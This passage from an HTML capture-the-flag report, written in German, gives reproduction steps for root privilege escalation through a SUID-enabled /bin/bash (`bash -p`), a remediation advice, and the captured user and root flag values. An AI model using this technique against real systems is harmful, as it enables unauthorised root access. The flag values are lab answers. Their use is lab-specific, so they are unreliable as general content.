+                 <strong>Voraussetzungen:</strong> Eine Shell-Sitzung als nicht-privilegierter Benutzer (hier `www-data`).
+             </p>
+             <p>
+                 <strong>Schritte zur Reproduktion:</strong>
+                 <ol>
+                     <li>Führe in der Low-Privilege-Shell den Befehl `/bin/bash -p` aus.</li>
+                     <li>Überprüfe die effektiven Rechte mit dem Befehl `id`.</li>
+                 </ol>
+             </p>
+             <p>
+                 <strong>Erwartetes Ergebnis:</strong> Der `id`-Befehl zeigt `euid=0(root)` an, was bestätigt, dass Root-Rechte erlangt wurden.
+             </p>
+              <p class="recommendation">
+                 <strong>Empfehlung (Admin):</strong> Entfernen Sie **dringend** das SUID-Bit von allen Shell-Executables wie `/bin/bash`, `/bin/sh`, `/usr/bin/zsh` etc. (`chmod u-s /path/to/shell`). SUID auf Shells ist fast immer eine gefährliche Fehlkonfiguration. Überprüfen Sie regelmäßig SUID/SGID-Berechtigungen im System.
+             </p>
+         </section>
+
+        <section id="flags">
+            <div class="flag-container">
+                <h2 class="flag-heading">Flags</h2>
+
+                 <div class="flag-entry">
+                    <div class="flag-command">cat /home/dev/user.txt</div>
+                    <div class="flag-value"><span class="password">71ab613fa286844425523780a7ebbab2</span></div>
+                </div>
+
+                <div class="flag-entry">
+                    <div class="flag-command">cat /root/root.txt</div>
+                    <div class="flag-value"><span class="password">BF9A57023EDD8CFAB92B8EA516676B0D</span></div>
+                </div>
+            </div>
+        </section>  
+
+    <footer class="footer">
+        <p>DarkSpirit - Cyber Security Reports</p>
+        <p>Berichtsdatum: 2024-04-30</p> <!-- Datum aus Scans -->
+    </footer>
+</body>
+</html>
